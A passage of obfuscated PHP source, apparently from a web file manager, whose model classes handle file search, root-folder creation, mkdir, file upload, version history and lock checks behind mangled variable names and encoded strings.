$“ÔÕ±ŞÓ[78] && !$¢§õ’ Ì) { return !1; } if ($İè‚¹­[$“ÔÕ±ŞÓ[489]] != $“ÔÕ±ŞÓ[78] && $¢§õ’ Ì) { return !1; } if (!strstr($¨–¹êãš[$“ÔÕ±ŞÓ[169]], $“ÔÕ±ŞÓ[50] . $İè‚¹­[$“ÔÕ±ŞÓ[489]] . $“ÔÕ±ŞÓ[50])) { return !1; } } if (isset($İè‚¹­[$“ÔÕ±ŞÓ[2272]]) && $İè‚¹­[$“ÔÕ±ŞÓ[2272]] < $¨–¹êãš[$“ÔÕ±ŞÓ[79]]) { return !1; } if (isset($İè‚¹­[$“ÔÕ±ŞÓ[2273]]) && $İè‚¹­[$“ÔÕ±ŞÓ[2273]] > $¨–¹êãš[$“ÔÕ±ŞÓ[79]]) { return !1; } if (isset($İè‚¹­[$“ÔÕ±ŞÓ[670]]) && $İè‚¹­[$“ÔÕ±ŞÓ[670]] != $¨–¹êãš[$“ÔÕ±ŞÓ[532]]) { return !1; } return !0; } public function listSearchChildren($Šû¶ë•÷, $ØÏğ‡£û = 5000) { $Œ—’Üª =& $_SERVER[ÅÄÇĞô]; $·ù™¹¼İ = array(); $¤¦‘Ÿ»Œ = $this->sourceInfo($Šû¶ë•÷); $¢ŸÒğÂÄ = array($Œ—’Üª[589] => array($Œ—’Üª[462], $¤¦‘Ÿ»Œ[$Œ—’Üª[589]] . $¤¦‘Ÿ»Œ[$Œ—’Üª[194]] . $Œ—’Üª[621])); $Åğğœ×Œ = $this->field($Œ—’Üª[79])->where($¢ŸÒğÂÄ)->limit($ØÏğ‡£û + 1)->select(); $¯ˆœîÂ× = is_array($Åğğœ×Œ) ? count($Åğğœ×Œ) : 0; if ($¯ˆœîÂ× > $ØÏğ‡£û) { return $this->_listSearchChildrenNear($Šû¶ë•÷, $ØÏğ‡£û); } $­†ÑúİŒ = $this->field($Œ—’Üª[194])->where($¢ŸÒğÂÄ)->select(); $·ù™¹¼İ = array_to_keyvalue($­†ÑúİŒ, $Œ—’Üª[12], $Œ—’Üª[194]); return $·ù™¹¼İ; } private function _listSearchChildrenNear($ÂçœÑ‹, $Ÿ†’ì•á) { $ù®šçôì =& $_SERVER[ÅÄÇĞô]; $ĞˆîáÀ = array(); $âÄÈ·èä = array($ù®šçôì[193] => $ÂçœÑ‹); $™àé…½ü = $this->field($ù®šçôì[2274])->where($âÄÈ·èä)->select(); $İ¾õİ¡Â = array_to_keyvalue(array_filter_by_field($™àé…½ü, $ù®šçôì[488], $ù®šçôì[91]), $ù®šçôì[12], $ù®šçôì[194]); $ĞˆîáÀ = array_merge($ĞˆîáÀ, array_to_keyvalue($™àé…½ü, $ù®šçôì[12], $ù®šçôì[194])); if (!$İ¾õİ¡Â) { return $ĞˆîáÀ; } $âÄÈ·èä = array($ù®šçôì[193] => array($ù®šçôì[7], $İ¾õİ¡Â)); $™àé…½ü = $this->field($ù®šçôì[2274])->where($âÄÈ·èä)->limit($Ÿ†’ì•á)->select(); $ĞˆîáÀ = array_merge($ĞˆîáÀ, array_to_keyvalue($™àé…½ü, $ù®šçôì[12], $ù®šçôì[194])); $ĞˆîáÀ = array_slice($ĞˆîáÀ, 0, intval($Ÿ†’ì•á)); return $ĞˆîáÀ; } private function _listSearchBindPinyin($Ïİéî¨, &$–Æ²³º°, &$ÅÂ†ÌÑ) { $à¦©õ² =& $_SERVER[ÅÄÇĞô]; if (!isset($Ïİéî¨[$à¦©õ²[2096]]) || !$Ïİéî¨[$à¦©õ²[2096]]) { return; } if (!Input::check($Ïİéî¨[$à¦©õ²[2096]], $à¦©õ²[396]) || strlen($Ïİéî¨[$à¦©õ²[2096]]) < 2) { return; } $¾áØ“³Ä = "\114\x45\106\x54\40\112\117\x49\116\x20{$this->tablePrefix}\x69\x6f\137\x73\157\x75\162\143\x65\x5f\155\x65\164\x61\40\x6d\145\164\141\40\157\x6e\x20\x73\x6f\x75\162\x63\145\x2e\x73\157\x75\x72\x63\145\111\x44\x20\x3d\40\155\145\x74\x61\56\x73\x6f\165\x72\x63\145\111\x44"; $øŒ±ÎÀÏ = array(); $ÅÂ†ÌÑ = str_replace(array($à¦©õ²[288], $à¦©õ²[53], $à¦©õ²[2275]), $à¦©õ²[12], $ÅÂ†ÌÑ); $ÅÂ†ÌÑ = $à¦©õ²[514] . str_replace($à¦©õ²[50], $à¦©õ²[515], $ÅÂ†ÌÑ); $Óä÷ˆ = $–Æ²³º°[$à¦©õ²[32]]; unset($–Æ²³º°[$à¦©õ²[32]]); foreach ($–Æ²³º° as $å«Ú°ÎÒ => $×•ŸÅè) { $øŒ±ÎÀÏ[$à¦©õ²[514] . $å«Ú°ÎÒ] = $×•ŸÅè; } foreach ($Óä÷ˆ as $›‹›ö³) { $øŒ±ÎÀÏ[] = array($à¦©õ²[519] => $›‹›ö³, $à¦©õ²[1100] => $à¦©õ²[2100], array($à¦©õ²[2276] => $›‹›ö³, $à¦©õ²[2277] => array($à¦©õ²[7], array($à¦©õ²[541], $à¦©õ²[540])))); } $this->join($¾áØ“³Ä); $–Æ²³º° = $øŒ±ÎÀÏ; } private function _parseSearchWhere($â”ŸÂÂØ) { $ÀİÈ—ù =& $_SERVER[ÅÄÇĞô]; $ïÄÜÕ±Š = array(); if (isset($â”ŸÂÂØ[$ÀİÈ—ù[855]]) && $â”ŸÂÂØ[$ÀİÈ—ù[855]]) { $ïÄÜÕ±Š[$ÀİÈ—ù[88]] = array($ÀİÈ—ù[2278], $â”ŸÂÂØ[$ÀİÈ—ù[855]]); } if (isset($â”ŸÂÂØ[$ÀİÈ—ù[856]]) && $â”ŸÂÂØ[$ÀİÈ—ù[856]]) { $ı¿ø¨Úº = array($ÀİÈ—ù[2279], $â”ŸÂÂØ[$ÀİÈ—ù[856]]); if ($ïÄÜÕ±Š[$ÀİÈ—ù[88]]) { $ïÄÜÕ±Š[$ÀİÈ—ù[88]] = array($ïÄÜÕ±Š[$ÀİÈ—ù[88]], $ı¿ø¨Úº, $ÀİÈ—ù[2280]); } else { $ïÄÜÕ±Š[$ÀİÈ—ù[88]] = $ı¿ø¨Úº; } } if (isset($â”ŸÂÂØ[$ÀİÈ—ù[2272]]) && $â”ŸÂÂØ[$ÀİÈ—ù[2272]] > 0) { $ïÄÜÕ±Š[$ÀİÈ—ù[79]] = array($ÀİÈ—ù[2278], $â”ŸÂÂØ[$ÀİÈ—ù[2272]]); } if (isset($â”ŸÂÂØ[$ÀİÈ—ù[2273]]) && $â”ŸÂÂØ[$ÀİÈ—ù[2273]]) { $ı¿ø¨Úº = array($ÀİÈ—ù[2279], $â”ŸÂÂØ[$ÀİÈ—ù[2273]]); if ($ïÄÜÕ±Š[$ÀİÈ—ù[79]]) { $ïÄÜÕ±Š[$ÀİÈ—ù[79]] = array($ïÄÜÕ±Š[$ÀİÈ—ù[79]], $ı¿ø¨Úº, $ÀİÈ—ù[2280]); } else { $ïÄÜÕ±Š[$ÀİÈ—ù[79]] = $ı¿ø¨Úº; } } if (isset($â”ŸÂÂØ[$ÀİÈ—ù[670]]) && $â”ŸÂÂØ[$ÀİÈ—ù[670]]) { $ïÄÜÕ±Š[] = array($ÀİÈ—ù[532] => $â”ŸÂÂØ[$ÀİÈ—ù[670]], $ÀİÈ—ù[530] => $â”ŸÂÂØ[$ÀİÈ—ù[670]], $ÀİÈ—ù[1100] => $ÀİÈ—ù[2100]); } if (isset($â”ŸÂÂØ[$ÀİÈ—ù[489]]) && $â”ŸÂÂØ[$ÀİÈ—ù[489]]) { $÷ÌßãÍé = $â”ŸÂÂØ[$ÀİÈ—ù[489]]; if ($÷ÌßãÍé == $ÀİÈ—ù[78]) { $ïÄÜÕ±Š[$ÀİÈ—ù[488]] = 1; } else { if ($÷ÌßãÍé == $ÀİÈ—ù[2281]) { $ïÄÜÕ±Š[$ÀİÈ—ù[488]] = 0; } else { if ($÷ÌßãÍé) { $÷ÌßãÍé = is_array($÷ÌßãÍé) ? $÷ÌßãÍé : explode($ÀİÈ—ù[50], $÷ÌßãÍé); $ïÄÜÕ±Š[$ÀİÈ—ù[489]] = array($ÀİÈ—ù[495], $÷ÌßãÍé); $ïÄÜÕ±Š[$ÀİÈ—ù[488]] = 0; } } } } $this->_parseSearchParent($â”ŸÂÂØ, $ïÄÜÕ±Š); if (isset($â”ŸÂÂØ[$ÀİÈ—ù[2096]]) && trim($â”ŸÂÂØ[$ÀİÈ—ù[2096]])) { $÷Âğãşê = trim($â”ŸÂÂØ[$ÀİÈ—ù[2096]]); $µí»Í±¿ = explode($ÀİÈ—ù[53], $÷Âğãşê); if (strlen($÷Âğãşê) > 2 && (substr($÷Âğãşê, 0, 1) == $ÀİÈ—ù[121] && substr($÷Âğãşê, -1) == $ÀİÈ—ù[121]) || substr($÷Âğãşê, 0, 1) == $ÀİÈ—ù[58] && substr($÷Âğãşê, -1) == $ÀİÈ—ù[58]) { $÷Âğãşê = substr($÷Âğãşê, 1, -1); $µí»Í±¿ = array($÷Âğãşê); } $ïÄÜÕ±Š[$ÀİÈ—ù[32]] = array(array($ÀİÈ—ù[620], $ÀİÈ—ù[2098] . $÷Âğãşê . $ÀİÈ—ù[2098])); if (count($µí»Í±¿) > 1) { $ïÄÜÕ±Š[$ÀİÈ—ù[32]] = array(); foreach ($µí»Í±¿ as $ê¿Â¸â) { if (!trim($ê¿Â¸â)) { continue; } $ïÄÜÕ±Š[$ÀİÈ—ù[32]][] = array($ÀİÈ—ù[620], $ÀİÈ—ù[2098] . trim($ê¿Â¸â) . $ÀİÈ—ù[2098]); } } } return $ïÄÜÕ±Š; } private function _parseSearchParent($ªùÚ×¿´, &$–³Ê†”Û) { $ùõŞ£ö =& $_SERVER[ÅÄÇĞô]; if (!isset($ªùÚ×¿´[$ùõŞ£ö[193]]) || !$ªùÚ×¿´[$ùõŞ£ö[193]]) { return; } $¢êÁŞÏ = $this->pathInfo($ªùÚ×¿´[$ùõŞ£ö[193]]); $‡ä¯Ö‘ş = $¢êÁŞÏ[$ùõŞ£ö[193]] . $ùõŞ£ö[12] === $ùõŞ£ö[231]; $ê¥Ò±¿ß = $¢êÁŞÏ[$ùõŞ£ö[191]] == $ùõŞ£ö[583]; if ($¢êÁŞÏ[$ùõŞ£ö[599]] == $ùõŞ£ö[600]) { $”³­úŒ = $this->sourceInfo($ªùÚ×¿´[$ùõŞ£ö[193]]); $¢êÁŞÏ[$ùõŞ£ö[589]] = $”³­úŒ[$ùõŞ£ö[589]]; } $–³Ê†”Û[$ùõŞ£ö[660]] = array($ùõŞ£ö[620], $¢êÁŞÏ[$ùõŞ£ö[589]] . $ªùÚ×¿´[$ùõŞ£ö[193]] . $ùõŞ£ö[621]); $ç˜°š¶Â = isset($ªùÚ×¿´[$ùõŞ£ö[1956]]) && in_array($ùõŞ£ö[583], $ªùÚ×¿´[$ùõŞ£ö[1956]]); if (!$ç˜°š¶Â || !$ê¥Ò±¿ß || !$‡ä¯Ö‘ş || !$¢êÁŞÏ[$ùõŞ£ö[490]]) { return; } if (!AuthModel::authCheckRoot($¢êÁŞÏ[$ùõŞ£ö[490]][$ùõŞ£ö[491]])) { return; } $Ñà­ÂºÉ = $¢êÁŞÏ[$ùõŞ£ö[574]] . $ùõŞ£ö[12]; if ($Ñà­ÂºÉ == $ùõŞ£ö[91]) { unset($–³Ê†”Û[$ùõŞ£ö[660]]); $–³Ê†”Û[$ùõŞ£ö[191]] = self::TYPE_GROUP; return; } $É¯ü³Ô½ = Model($ùõŞ£ö[590])->groupChildrenAll($Ñà­ÂºÉ); $Å€Ä™Şï = count($É¯ü³Ô½); if ($Å€Ä™Şï <= 1) { return; } $›½’ã = array($ùõŞ£ö[193] => 0, $ùõŞ£ö[191] => self::TYPE_GROUP, $ùõŞ£ö[574] => array($ùõŞ£ö[7], $É¯ü³Ô½)); $õåœ°¬ = $this->field($ùõŞ£ö[2282])->where($›½’ã)->limit($Å€Ä™Şï)->select(); $–³Ê†”Û[$ùõŞ£ö[660]] = array(); foreach ($õåœ°¬ as $Ç¹õ²É) { $–³Ê†”Û[$ùõŞ£ö[660]][] = array($ùõŞ£ö[620], $ùõŞ£ö[598] . $Ç¹õ²É[$ùõŞ£ö[194]] . $ùõŞ£ö[621]); } $–³Ê†”Û[$ùõŞ£ö[660]][] = $ùõŞ£ö[2100]; } } class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($Ù¯€Éğ¥) { $èÎ·¡ğö =& $_SERVER[ÅÄÇĞô]; $º·é´è‡ = Model($èÎ·¡ğö[582])->where(array($èÎ·¡ğö[1788] => $Ù¯€Éğ¥))->find(); $ÁƒßùŒÌ = $this->_mkdirRoot(SourceModel::TYPE_USER, $Ù¯€Éğ¥, $º·é´è‡[$èÎ·¡ğö[32]]); $this->userDesktopAdd($ÁƒßùŒÌ); return $ÁƒßùŒÌ; } public function userDesktopAdd($•§ËÇ‘) { $˜†«É›ú =& $_SERVER[ÅÄÇĞô]; $ğ¸ÒÙİ¾ = LNG($˜†«É›ú[2283]); $™ñâ³è = $this->mkdir($•§ËÇ‘, $ğ¸ÒÙİ¾); $this->metaSet($™ñâ³è, $˜†«É›ú[2284], $˜†«É›ú[91]); $this->metaSet($•§ËÇ‘, $˜†«É›ú[2285], $™ñâ³è); } public function userPathSafeAdd($…Ç…±ÑÂ) { $¿öƒô•´ =& $_SERVER[ÅÄÇĞô]; $ÒŠ¬Š× = Model($¿öƒô•´[582])->getInfoFull($…Ç…±ÑÂ); if (!$ÒŠ¬Š×) { return !1; } if (_get($ÒŠ¬Š×, $¿öƒô•´[603])) { return $ÒŠ¬Š×[$¿öƒô•´[544]][$¿öƒô•´[2286]]; } $ÁõÅÏÅÈ = $this->_mkdirRoot(SourceModel::TYPE_USER, $…Ç…±ÑÂ, $¿öƒô•´[2287], $¿öƒô•´[2288]); Model($¿öƒô•´[582])->metaSet($…Ç…±ÑÂ, $¿öƒô•´[2286], $ÁõÅÏÅÈ); $this->metaSet($ÁõÅÏÅÈ, $¿öƒô•´[2289], $…Ç…±ÑÂ); return $ÁõÅÏÅÈ; } public function userPathAppAdd($âÔéõ–ß, $êÛ‘ûò© = '', $›äîş•ˆ = '') { $¼ñéúĞ’ =& $_SERVER[ÅÄÇĞô]; $Ôêç›Š = Model($¼ñéúĞ’[582])->getInfoFull($âÔéõ–ß); if (!$Ôêç›Š) { return !1; } $ÆĞ«şÜù = $Ôêç›Š[$¼ñéúĞ’[544]] ? $Ôêç›Š[$¼ñéúĞ’[544]] : array(); $ÍÚÚá = $ÆĞ«şÜù[$¼ñéúĞ’[2290]]; if (!$ÍÚÚá) { $ÍÚÚá = $this->_mkdirRoot(SourceModel::TYPE_USER, $âÔéõ–ß, $¼ñéúĞ’[2291], $¼ñéúĞ’[2292]); Model($¼ñéúĞ’[582])->metaSet($âÔéõ–ß, $¼ñéúĞ’[2290], $ÍÚÚá . $¼ñéúĞ’[12]); $this->metaSet($ÍÚÚá, $¼ñéúĞ’[2290], $âÔéõ–ß); } if (!$êÛ‘ûò©) { return $ÍÚÚá; } $æ”¾—Œ£ = $ÆĞ«şÜù[$¼ñéúĞ’[2293] . $êÛ‘ûò©]; if (!$æ”¾—Œ£) { $æ”¾—Œ£ = $this->mkdir($ÍÚÚá, $êÛ‘ûò©); Model($¼ñéúĞ’[582])->metaSet($âÔéõ–ß, $¼ñéúĞ’[2293] . $êÛ‘ûò©, $æ”¾—Œ£); $this->metaSet($æ”¾—Œ£, $¼ñéúĞ’[2293] . $êÛ‘ûò©, $âÔéõ–ß); } if (!$›äîş•ˆ) { return $æ”¾—Œ£; } $ ´ôŒêŠ = $this->mkdir($æ”¾—Œ£, $›äîş•ˆ); return $ ´ôŒêŠ; } public function groupRootAdd($³ªÙƒÄÖ) { $ôÀ…å‹Ì =& $_SERVER[ÅÄÇĞô]; $ÛŞ’’çà = Model($ôÀ…å‹Ì[590])->where(array($ôÀ…å‹Ì[2090] => $³ªÙƒÄÖ))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $³ªÙƒÄÖ, $ÛŞ’’çà[$ôÀ…å‹Ì[32]]); } public function systemRootPathAdd($±å„–úë) { if ($±å„–úë != $_SERVER[ÅÄÇĞô][613]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $±å„–úë); } public function userRootRemove($ÓèíÆãé) { $Êù§¢¤· = $this->targetSourceRoot(SourceModel::TYPE_USER, $ÓèíÆãé, !0); foreach ($Êù§¢¤· as $º¡†í¹„) { if (!$º¡†í¹„) { continue; } $this->remove($º¡†í¹„[$_SERVER[ÅÄÇĞô][194]], !1); } } public function groupRootRemove($¾–àó»») { $‡ÓŠˆÀœ = $this->targetSourceRoot(SourceModel::TYPE_GROUP, $¾–àó»»); if (!$‡ÓŠˆÀœ) { return; } $this->remove($‡ÓŠˆÀœ[$_SERVER[ÅÄÇĞô][194]], !1); } private function _mkdirRoot($¿‘¼Ë¥ª, $çœÁÜ«©, $ìÖ¶œ–ô, $×ï›ÄÀÑ = '') { $É×åø»½ =& $_SERVER[ÅÄÇĞô]; $êÓ¦Ù¦é = defined($É×åø»½[2228]) ? USER_ID : 0; $º²‡÷´› = array($É×åø»½[480] => 0, $É×åø»½[656] => $¿‘¼Ë¥ª, $É×åø»½[657] => $çœÁÜ«©, $É×åø»½[654] => 1, $É×åø»½[658] => $êÓ¦Ù¦é, $É×åø»½[659] => $êÓ¦Ù¦é, $É×åø»½[655] => $×ï›ÄÀÑ, $É×åø»½[660] => $É×åø»½[598], $É×åø»½[507] => 0, $É×åø»½[625] => 0, $É×åø»½[547] => 0, $É×åø»½[661] => $É×åø»½[12]); if ($³šë´„ = $this->where($º²‡÷´›)->find()) { return $³šë´„[$É×åø»½[194]]; } $¹öÒÜĞ = "\x4d\157\x64\x65\154\x53\x6f\x75\162\143\145\56\155\x6b\144\151\162\122\157\x6f\164\x2e{$¿‘¼Ë¥ª}\x2e{$çœÁÜ«©}\x2e" . $ìÖ¶œ–ô; CacheLock::lock($¹öÒÜĞ); $º²‡÷´›[$É×åø»½[32]] = $ìÖ¶œ–ô; $®Á¥¹¶² = $this->add($º²‡÷´›); $èË¬Î  = array($É×åø»½[662] => short_id($®Á¥¹¶²)); $this->where(array($É×åø»½[494] => $®Á¥¹¶²))->save($èË¬Î ); CacheLock::unlock($¹öÒÜĞ); return $®Á¥¹¶²; } private function targetSourceRoot($–•ìÏÖì, $Ï€²Ñ˜Š, $³ÏçÉÁ³ = false) { $› ¹½à =& $_SERVER[ÅÄÇĞô]; $à™÷åø = array($› ¹½à[480] => 0, $› ¹½à[656] => $–•ìÏÖì, $› ¹½à[657] => $Ï€²Ñ˜Š); if ($³ÏçÉÁ³) { $†™²ØœØ = $this->where($à™÷åø)->select(); return $†™²ØœØ ? $†™²ØœØ : array(); } $ûÊ÷øé˜ = $this->where($à™÷åø)->find(); return $ûÊ÷øé˜ ? $ûÊ÷øé˜ : array(); } public function sourceRootGroup($ú­ò¨ñª) { $¥Å–Ñ =& $_SERVER[ÅÄÇĞô]; if (is_string($ú­ò¨ñª)) { $ú­ò¨ñª = array($ú­ò¨ñª); } $ïÙ¾œéà = $this->listSourceRoot(SourceModel::TYPE_GROUP, $ú­ò¨ñª, $¥Å–Ñ[223]); $öôÊÅ¿Ÿ = array($¥Å–Ñ[448] => $ïÙ¾œéà, $¥Å–Ñ[445] => array($¥Å–Ñ[853] => count($ú­ò¨ñª))); $this->_listDataApply($öôÊÅ¿Ÿ[$¥Å–Ñ[448]]); $this->_listMake($öôÊÅ¿Ÿ); return array_to_keyvalue($öôÊÅ¿Ÿ[$¥Å–Ñ[85]], $¥Å–Ñ[574]); } public function mkfile($‹®¶îà, $óŸ™ã†©, $ó„ÊùÄá = '', $†Æ¢úºş = REPEAT_RENAME) { $Â™¢¹… =& $_SERVER[ÅÄÇĞô]; $Ôˆ¶õ› = Model($Â™¢¹…[682])->addFileByContent($ó„ÊùÄá, $óŸ™ã†©); return $this->_createFileCall($‹®¶îà, $óŸ™ã†©, $Ôˆ¶õ›, $†Æ¢úºş, $Â™¢¹…[1454]); } public function addFile($ï½å·Êì, $à™•èü¯, $é…¤Û , $‡óÔÔ¦í = false, $¤Ú¡ÇºÚ = REPEAT_RENAME) { $Ä€ûÉ·û = Model($_SERVER[ÅÄÇĞô][682])->addFile($à™•èü¯, $é…¤Û , $‡óÔÔ¦í); return $this->_createFileCall($ï½å·Êì, $é…¤Û , $Ä€ûÉ·û, $¤Ú¡ÇºÚ); } public function addFileByFileID($€äªÊŸ³, $Šúë¿ , $ÇÄÓ¥—, $½ËÂâº = REPEAT_RENAME) { $¤×ÛÖ³” =& $_SERVER[ÅÄÇĞô]; $è²»²‰Ä = Model($¤×ÛÖ³”[682])->find($Šúë¿ ); Model($¤×ÛÖ³”[682])->linkAdd($Šúë¿ ); return $this->_createFileCall($€äªÊŸ³, $ÇÄÓ¥—, $è²»²‰Ä, $½ËÂâº); } public function addFileByRemote($‡ã¡Æ«, $íµ–»¨˜, $óôÄ™ƒÚ, $Í®ßº = array(), $Ô¦Œ©ı = REPEAT_RENAME) { $ù¤£õïÇ = Model($_SERVER[ÅÄÇĞô][682])->addFileByRemote($íµ–»¨˜, $óôÄ™ƒÚ, $Í®ßº); return $this->_createFileCall($‡ã¡Æ«, $óôÄ™ƒÚ, $ù¤£õïÇ, $Ô¦Œ©ı); } private function _createFileCall($Úš·ß‹, $íÛ‰×ôÉ, $ƒÒ¬üŠ½, $‚ï—ùâ±, $ïŒ³Â¥Õ = "\x75\x70\x6c\x6f\141\x64") { $˜°ô‰ÑĞ =& $_SERVER[ÅÄÇĞô]; if (!$ƒÒ¬üŠ½) { return !1; } $÷ıê£ªÁ = !1; $this->setMasterDB(); $this->lockWriteStart($Úš·ß‹, $íÛ‰×ôÉ); $›½Ÿ‚Í· = $this->fileNameExist($Úš·ß‹, $íÛ‰×ôÉ); $•ÂŸ¬»¬ = $this->_createFile($Úš·ß‹, $íÛ‰×ôÉ, $ƒÒ¬üŠ½, $‚ï—ùâ±, $÷ıê£ªÁ); if (!$÷ıê£ªÁ) { Model($˜°ô‰ÑĞ[549])->remove($ƒÒ¬üŠ½[$˜°ô‰ÑĞ[546]]); } if ($÷ıê£ªÁ && $•ÂŸ¬»¬ && $•ÂŸ¬»¬ != $›½Ÿ‚Í·) { Model($˜°ô‰ÑĞ[2255])->eventCreate($•ÂŸ¬»¬, $ïŒ³Â¥Õ); } $this->lockWriteEnd($Úš·ß‹, $íÛ‰×ôÉ); return $•ÂŸ¬»¬; } public function mkdir($ÔÓêÍùü, $Ò±°ØÉı, $Å‰ÌÍúÎ = REPEAT_SKIP) { $½ı–‹– =& $_SERVER[ÅÄÇĞô]; $this->setMasterDB(); $¯¹¹ñ¶ş = $this->sourceInfo($ÔÓêÍùü); if (!$¯¹¹ñ¶ş) { return !1; } $this->lockWriteStart($ÔÓêÍùü, $Ò±°ØÉı); if ($Å‰ÌÍúÎ !== !1) { $–Ê¶Ÿ—‹ = $this->fileNameExist($ÔÓêÍùü, $Ò±°ØÉı); if ($–Ê¶Ÿ—‹ && $Å‰ÌÍúÎ != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($ÔÓêÍùü, $Ò±°ØÉı); return $–Ê¶Ÿ—‹; } $Ò±°ØÉı = $this->fileNameAuto($ÔÓêÍùü, $Ò±°ØÉı, $Å‰ÌÍúÎ); } $™‹°·ï’ = array($½ı–‹–[654] => 1, $½ı–‹–[497] => $Ò±°ØÉı, $½ı–‹–[655] => $½ı–‹–[12], $½ı–‹–[547] => 0, $½ı–‹–[625] => 0); $¡³Úß­ = $this->_addSource($™‹°·ï’, $¯¹¹ñ¶ş); Model($½ı–‹–[2255])->eventCreate($¡³Úß­, $½ı–‹–[1455]); $this->lockWriteEnd($ÔÓêÍùü, $Ò±°ØÉı); return $¡³Úß­; } public function listSourceRoot($¤ìÅ”ş, $ûÅîğ˜£, $¾£†‚’Ô = "\163\x6f\165\x72\x63\145\111\x44\x2c\x74\x61\x72\x67\145\x74\111\104\x2c\163\x69\172\145") { $öì¤üâÛ =& $_SERVER[ÅÄÇĞô]; $¤Ó¡üÉĞ = $öì¤üâÛ[457]; $½şÙÆâã = array(); $ô‚ÚÒ„è = 1024 * 50; $©ùˆÛùº = is_array($©ùˆÛùº) ? $©ùˆÛùº : array(); $›÷áÂ˜ = count($ûÅîğ˜£); $€«ˆéÛ½ = $this->tablePrefix . $öì¤üâÛ[2294]; for ($×ø‘³¨ú = 0; $×ø‘³¨ú < $›÷áÂ˜; $×ø‘³¨ú++) { $İı†½âı = $ûÅîğ˜£[$×ø‘³¨ú]; $¤Ó¡üÉĞ .= "\123\105\x4c\x45\103\x54\40\x2a\x20\106\122\117\x4d\40\50\123\105\x4c\x45\x43\x54\40{$¾£†‚’Ô}\40\x46\x52\117\115\40\140{$€«ˆéÛ½}\x60\40\x57\x48\105\x52\105\x20"; $¤Ó¡üÉĞ .= "\140\160\x61\x72\x65\x6e\164\x49\x44\140\75\60\40\x41\116\104\x20\x60\164\141\162\147\x65\x74\111\104\140\75{$İı†½âı}\x20\101\116\104\x20\x60\x74\141\x72\147\x65\x74\124\171\160\145\140\x3d{$¤ìÅ”ş}\40\x61\156\x64\x20\146\x69\154\x65\x54\171\x70\145\x3d\47\47\x20\154\151\x6d\151\x74\40\61\x29\x20\x61\x73\40\164\x62\x5f{$×ø‘³¨ú}\x20\x55\x4e\111\117\116\x20\101\x4c\114\x20"; if ((strlen($¤Ó¡üÉĞ) >= $ô‚ÚÒ„è || $×ø‘³¨ú == $›÷áÂ˜ - 1) && $¤Ó¡üÉĞ) { $¤Ó¡üÉĞ = substr($¤Ó¡üÉĞ, 0, -strlen($öì¤üâÛ[1138])); $©½šù¿ = $this->query($¤Ó¡üÉĞ); $¤Ó¡üÉĞ = $öì¤üâÛ[12]; $½şÙÆâã = array_merge($½şÙÆâã, $©½šù¿); } } return $½şÙÆâã; } private function _createFile($ãíº¸ñä, $°ßÎÍÊ, $îçé±ûû, $¤ƒñ‰µ§, &$ÄÓñÅ»») { $¨ÏÅµÂî =& $_SERVER[ÅÄÇĞô]; $õ¡ÚíğÏ = $this->sourceInfo($ãíº¸ñä); if (!$îçé±ûû || !$õ¡ÚíğÏ) { return !1; } if ($¤ƒñ‰µ§ !== !1) { $”Ö‡­ÉÃ = $this->fileNameExist($ãíº¸ñä, $°ßÎÍÊ); } $ÄÓñÅ»» = !0; if ($¤ƒñ‰µ§ && $”Ö‡­ÉÃ) { if ($¤ƒñ‰µ§ == REPEAT_SKIP) { $ÄÓñÅ»» = !1; return $”Ö‡­ÉÃ; } else { if ($¤ƒñ‰µ§ == REPEAT_REPLACE) { $ÁçĞ‘ò™ = $this->sourceInfo($”Ö‡­ÉÃ); $êò ÕÄ = $this->fileHistory($ÁçĞ‘ò™, $îçé±ûû[$¨ÏÅµÂî[546]], $îçé±ûû[$¨ÏÅµÂî[79]]); if (!$êò ÕÄ) { $ÄÓñÅ»» = !1; } else { $this->folderSizeReset($ãíº¸ñä); } return $”Ö‡­ÉÃ; } else { $°ßÎÍÊ = $this->fileNameAuto($ãíº¸ñä, $°ßÎÍÊ, $¤ƒñ‰µ§, !1); } } } $ğØ¢üŒê = array($¨ÏÅµÂî[654] => 0, $¨ÏÅµÂî[497] => $°ßÎÍÊ, $¨ÏÅµÂî[655] => substr(get_path_ext($°ßÎÍÊ), 0, 10), $¨ÏÅµÂî[547] => $îçé±ûû[$¨ÏÅµÂî[546]], $¨ÏÅµÂî[625] => $îçé±ûû[$¨ÏÅµÂî[79]]); $ÂÓÇ½«ò = $this->_addSource($ğØ¢üŒê, $õ¡ÚíğÏ); $this->folderSizeReset($ãíº¸ñä, intval($ğØ¢üŒê[$¨ÏÅµÂî[79]])); return $ÂÓÇ½«ò; } protected function fileHistory($›Í¦‹Óê, $—¾ ú¡£, $¯Åœ‰ıÏ) { $îíæ–´Ö =& $_SERVER[ÅÄÇĞô]; if ($›Í¦‹Óê[$îíæ–´Ö[546]] == $—¾ ú¡£) { return !1; } $this->checkLock($›Í¦‹Óê[$îíæ–´Ö[194]], $—¾ ú¡£); Model($îíæ–´Ö[2295])->addHistory($›Í¦‹Óê); $ï„§Î‘ù = array($îíæ–´Ö[659] => USER_ID, $îíæ–´Ö[501] => time(), $îíæ–´Ö[546] => $—¾ ú¡£, $îíæ–´Ö[79] => $¯Åœ‰ıÏ); $this->where(array($îíæ–´Ö[494] => $›Í¦‹Óê[$îíæ–´Ö[194]]))->save($ï„§Î‘ù); $this->sourceCacheClear($›Í¦‹Óê[$îíæ–´Ö[194]]); return !0; } public function checkLock($¨˜­¢‘‡, $µ€ß¯ö’) { $Ù™Ó’Ç¯ =& $_SERVER[ÅÄÇĞô]; $Ìı‡İàŸ = $this->pathInfo($¨˜­¢‘‡); if (!$this->fileIsLock($Ìı‡İàŸ, !0)) { return; } $‰Ä¥£ÅÚ = Session::get($Ù™Ó’Ç¯[2296]); $¶®˜¹´† = substr($Ìı‡İàŸ[$Ù™Ó’Ç¯[32]], 0, -1 - strlen($Ìı‡İàŸ[$Ù™Ó’Ç¯[169]])) . $Ù™Ó’Ç¯[1316] . $‰Ä¥£ÅÚ . $Ù™Ó’Ç¯[10] . $Ìı‡İàŸ[$Ù™Ó’Ç¯[169]]; $óä‹øøø = Model($Ù™Ó’Ç¯[682])->find($µ€ß¯ö’); $this->_createFileCall($Ìı‡İàŸ[$Ù™Ó’Ç¯[193]], $¶®˜¹´†, $óä‹øøø, REPEAT_REPLACE, $Ù™Ó’Ç¯[1454]); $²ç—ıÔ® = $Ìı‡İàŸ[$Ù™Ó’Ç¯[544]][$Ù™Ó’Ç¯[618]]; $äˆ˜ Ğó = 